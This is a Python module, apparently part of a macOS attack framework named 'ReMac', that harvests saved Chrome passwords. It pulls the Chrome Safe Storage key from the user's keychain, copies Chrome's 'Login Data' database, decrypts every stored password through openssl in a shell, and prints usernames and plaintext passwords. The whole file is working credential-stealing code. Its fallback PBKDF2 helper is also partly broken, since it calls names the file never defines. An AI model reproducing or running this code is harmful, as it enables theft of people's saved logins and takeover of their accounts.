# from modInterface import ReMacModInterface
import shutil
import sqlite3
import os
from os.path import expanduser
import base64
import binascii
import glob
import hmac
import itertools
import operator
import shutil
import sqlite3
import struct
import subprocess
import tempfile
import hashlib

try:
    xrange
except NameError:
    # Python3 support.
    # noinspection PyShadowingBuiltins
    xrange = range

class mod_chrome_logins():

    def __init__(self):
        self.setup_mod()

    def setup_mod(self):
        print(f'Module Setup (mod_chrome_logins) called successfully!')
        pass

    def pbkdf2_bin(self, password, salt, iterations, keylen=16):
        # Thanks to mitsuhiko for this function:
        # https://github.com/mitsuhiko/python-pbkdf2
        _pack_int = struct.Struct('>I').pack
        hashfunc = sha1
        mac = hmac.new(password, None, hashfunc)

        def _pseudorandom(x, mac=mac):
            h = mac.copy()
            h.update(x)
            return map(ord, h.digest())

        buf = []
        for block in xrange(1, -(-keylen // mac.digest_size) + 1):
            rv = u = _pseudorandom(salt + _pack_int(block))
            for i in xrange(iterations - 1):
                u = _pseudorandom(''.join(map(chr, u)))
                rv = itertools.starmap(operator.xor, itertools.izip(rv, u))
            buf.extend(rv)
        return ''.join(map(chr, buf))[:keylen]

    try:
        from hashlib import pbkdf2_hmac
    except ImportError:
        # Python version not available (Python < 2.7.8, macOS < 10.11),
        # use mitsuhiko's pbkdf2 method.
        pbkdf2_hmac = pbkdf2_bin
        from hashlib import sha1

    def chrome_decrypt(self, encrypted, safe_storage_key):
    # def chrome_decrypt(self, encrypted, key):
    #     iv = ''.join(('20',) * 16)
    #     key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
    #
    #     hex_key = binascii.hexlify(key)
    #     hex_enc_password = base64.b64encode(encrypted[3:])
    #     try:
    #         decrypted = subprocess.check_output(
    #             "openssl enc -base64 -d "
    #             "-aes-128-cbc -iv '{}' -K {} <<< "
    #             "{} 2>/dev/null".format(iv, hex_key, hex_enc_password),
    #             shell=True)
    #     except subprocess.CalledProcessError:
    #         decrypted = "n/a"
    #
    #     return decrypted
        """
        AES decryption using the PBKDF2 key and 16x " " IV
        via openSSL (installed on OSX natively)

        Salt, iterations, iv, size:
        https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
        """

        iv = "".join(("20",) * 16)
        key = hashlib.pbkdf2_hmac("sha1", safe_storage_key, b"saltysalt", 1003)[:16]

        hex_key = binascii.hexlify(key)
        hex_enc_password = base64.b64encode(encrypted[3:])

        # Send any error messages to /dev/null to prevent screen bloating up
        # (any decryption errors will give a non-zero exit, causing exception)
        try:
            strTmp = f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K '{hex_key}' <<< '{hex_enc_password}' 2>/dev/null"
            strTmp = strTmp.replace("'b'", "'")
            strTmp = strTmp.replace("''", "'")
            # print(strTmp)
            decrypted = subprocess.check_output(
                strTmp,
                shell=True)
            # decrypted = subprocess.check_output(
            #     "openssl enc -base64 -d "
            #     "-aes-128-cbc -iv '{}' -K {} <<< "
            #     "{} 2>/dev/null".format(iv, hex_key, hex_enc_password),
            #     shell=True)
        except subprocess.CalledProcessError:
            decrypted = "Error decrypting this data."

        return decrypted

    def run_mod(self):
        safe_storage_key = subprocess.Popen(
            "security find-generic-password -wa "
            "'Chrome'",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True)

        stdout, stderr = safe_storage_key.communicate()

        if stderr:
            print("Error: {}. Chrome entry not found in keychain?".format(stderr))
        elif not stdout:
            print("User clicked deny.")
        else:
            # tmpO = stdout.decode("utf-8")
            # tmpO = tmpO.replace("\n", "")
            safe_storage_key = stdout[:-1]
            # safe_storage_key = safe_storage_key.replace("\n", "")
            # tmpO = safe_storage_key.decode("utf-8")
            # print(tmpO)
            # chrome(chrome_data, safe_storage_key)

        # return safe_storage_key

        shutil.copy2(expanduser("~") + '/Library/Application Support/Google/Chrome/Default/Login Data', 'chrome_logins')

        con = sqlite3.connect('chrome_logins')
        cur = con.cursor()
        query_result = cur.execute('SELECT * FROM logins')
        for row in query_result:
            passwd = self.chrome_decrypt(row[5], safe_storage_key)
            if(row[3] != ""):
                print(f'User: {row[3]}, Paswword: {passwd}')
            else:
                continue

        cur.close()
        con.close()
        # os.remove('chrome_logins')
        return query_result



